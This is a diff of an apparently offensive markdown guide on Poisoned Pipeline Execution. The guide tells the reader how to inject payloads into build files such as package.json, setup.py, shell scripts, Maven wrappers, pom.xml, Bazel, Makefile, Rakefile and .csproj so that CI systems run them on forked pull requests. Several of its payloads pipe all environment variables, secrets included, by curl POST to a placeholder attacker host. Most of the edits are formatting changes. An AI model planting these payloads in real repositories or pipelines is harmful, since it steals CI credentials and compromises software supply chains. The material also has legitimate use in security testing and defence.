@@ -2,7 +2,6 @@
 
 > CI/CD pipelines are often triggered by untrusted actions such a forked pull requests and new issue submissions for public git repositories. These systems often contain sensitive secrets or run in privileged environments. Attackers may gain an RCE into such systems by submitting crafted payloads that trigger the pipelines. Such vulnerabilities are also known as Poisoned Pipeline Execution (PPE).
 
-
 ## Summary
 
 - [Tools](#tools)
@@ -15,7 +14,7 @@
     - [Makefile](#makefile)
     - [Rakefile](#rakefile)
     - [C# - *.csproj](#c---csproj)
-- [CI/CD products](#cicd-products)
+- [CI/CD Products](#summary)
     - [GitHub Actions](./github-actions)
     - [Azure Pipelines (Azure DevOps)](./azure-devops)
     - [Circle CI](./circle-ci)
@@ -23,31 +22,30 @@
     - [BuildKite](./buildkite)
 - [References](#references)
 
-
 ## Tools
 
-* [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Self-Hosted Runner Enumeration and Attack Tool
-* [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow) - A GitHub Actions Supply Chain CTF / Goat
-
+- [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Self-Hosted Runner Enumeration and Attack Tool
+- [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow) - A GitHub Actions Supply Chain CTF / Goat
 
 ## Package managers & Build Files
 
 > Code injections into build files are CI agnostic and therefore they make great targets when you don't know what system builds the repository, or if there are multiple CI's in the process.\
-> In the examples below you need to either replace the files with the sample payloads, or inject your own payloads into existing files by editing just a part of them.\n
+> In the examples below you need to either replace the files with the sample payloads, or inject your own payloads into existing files by editing just a part of them.\
 > If the CI builds forked pull requests then your payload may run in the CI.
 
 ### Javascript / Typescript - package.json
 
-> The `package.json` file is used by many Javascript / Typescript package managers (`yarn`,`npm`,`pnpm`,`npx`....).
+The `package.json` file is used by many Javascript / Typescript package managers (`yarn`,`npm`,`pnpm`,`npx`....).
 
-> The file may contain a `scripts` object with custom commands to run.\
-`preinstall`, `install`, `build` & `test` are often executed by default in most CI/CD pipelines - hence they are good targets for injection.\
-> If you come across a `package.json` file - edit the `scripts` object and inject your instruction there
+The file may contain a `scripts` object with custom commands to run.\
+`preinstall`, `install`, `build` & `test` are often executed by default in most CI/CD pipelines - hence they are good targets for injection.
 
+If you come across a `package.json` file - edit the `scripts` object and inject your instruction there
 
 NOTE: the payloads in the instructions above must be `json escaped`.
 
 Example:
+
 ```json
 {
   "name": "my_package",
@@ -68,7 +66,6 @@ Example:
 }
 ```
 
-
 ### Python - setup.py
 
 > `setup.py` is used by python's package managers during the build process.
@@ -81,7 +78,6 @@ import os
 os.system('set | curl -X POST --data-binary @- {YourHostName}')
 ```
 
-
 ### Bash / sh - *.sh
 
 > Shell scripts in the repository are often executed in custom CI/CD pipelines.\
@@ -91,19 +87,16 @@ os.system('set | curl -X POST --data-binary @- {YourHostName}')
 set | curl -X POST --data-binary @- {YourHostName}
 ```
 
-
-
 ### Maven / Gradle
 
 > These package managers come with "wrappers" that help with running custom commands for building / testing the project.\
 These wrappers are essentially executable shell/cmd scripts.
 Replace them with your payloads to have them executed:
 
-- `gradlew` 
+- `gradlew`
 - `mvnw`
 - `gradlew.bat` (windows)
 - `mvnw.cmd` (windows)
-
 
 > Occasionally the wrappers will not be present in the repository.\
 > In such cases you can edit the `pom.xml` file, which instructs maven what dependencies to fetch and which `plugins` to run.\
@@ -112,7 +105,6 @@ Replace them with your payloads to have them executed:
 > If if **doesn't** contain a `<plugins>` node then add it under the `<build>` node.
 
 NOTE: remember that your payload is inserted in an XML document - XML special characters must be escaped.
-
 
 ```xml
 <build>
@@ -144,7 +136,6 @@ NOTE: remember that your payload is inserted in an XML document - XML special ch
 </build>
 ```
 
-
 ### BUILD.bazel
 
 > Replace the content of `BUILD.bazel` with the following payload
@@ -161,7 +152,6 @@ genrule(
 )
 ```
 
-
 ### Makefile
 
 > Make files are often executed by build pipelines for projects written in `C`, `C++` or `Go` (but not exclusively).\
@@ -173,21 +163,19 @@ genrule(
 .DEFAULT_GOAL := build
 .PHONY: all
 all: 
-	set | curl -X POST --data-binary @- {YourHostName}
+ set | curl -X POST --data-binary @- {YourHostName}
 build: 
-	set | curl -X POST --data-binary @- {YourHostName}
+ set | curl -X POST --data-binary @- {YourHostName}
 compile:
     set | curl -X POST --data-binary @- {YourHostName}
 default:
     set | curl -X POST --data-binary @- {YourHostName}
 ```
 
-
 ### Rakefile
 
 > Rake files are similar to `Makefile` but for Ruby projects.\
 > Replace your target `Rakefile` with the following payload
-
 
 ```shell
 task :pre_task do
@@ -209,7 +197,6 @@ end
 task :default => [:build]
 ```
 
-
 ### C# - *.csproj
 
 > `.csproj` files are build file for the `C#` runtime.\
@@ -217,7 +204,6 @@ task :default => [:build]
 > Replacing all the `.csproj` files in the repo with the following payload may trigger their execution by the CI.
 
 NOTE: Since this is an XML file - XML special characters must be escaped.
-
 
 ```powershell
 <Project>
@@ -227,10 +213,9 @@ NOTE: Since this is an XML file - XML special characters must be escaped.
 </Project>
 ```
 
-
 ## References
 
-* [Poisoned Pipeline Execution](https://web.archive.org/web/20240226215436/https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/)
-* [DEF CON 25 - Exploiting Continuous Integration (CI) and Automated Build systems - spaceB0x - 2 nov. 2017](https://youtu.be/mpUDqo7tIk8)
-* [Azure DevOps CICD Pipelines - Command Injection with Parameters, Variables and a discussion on Runner hijacking - Sana Oshika - May 1 2023](https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection)
-* [x33fcon lighting talk - Hacking Java serialization from python - Tomasz Bukowski - 16 july 2024](https://youtu.be/14tNFwfety4)
+- [Poisoned Pipeline Execution](https://web.archive.org/web/20240226215436/https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/)
+- [DEF CON 25 - Exploiting Continuous Integration (CI) and Automated Build systems - spaceB0x - 2 nov. 2017](https://youtu.be/mpUDqo7tIk8)
+- [Azure DevOps CICD Pipelines - Command Injection with Parameters, Variables and a discussion on Runner hijacking - Sana Oshika - May 1 2023](https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection)
+- [x33fcon lighting talk - Hacking Java serialization from python - Tomasz Bukowski - 16 july 2024](https://youtu.be/14tNFwfety4)
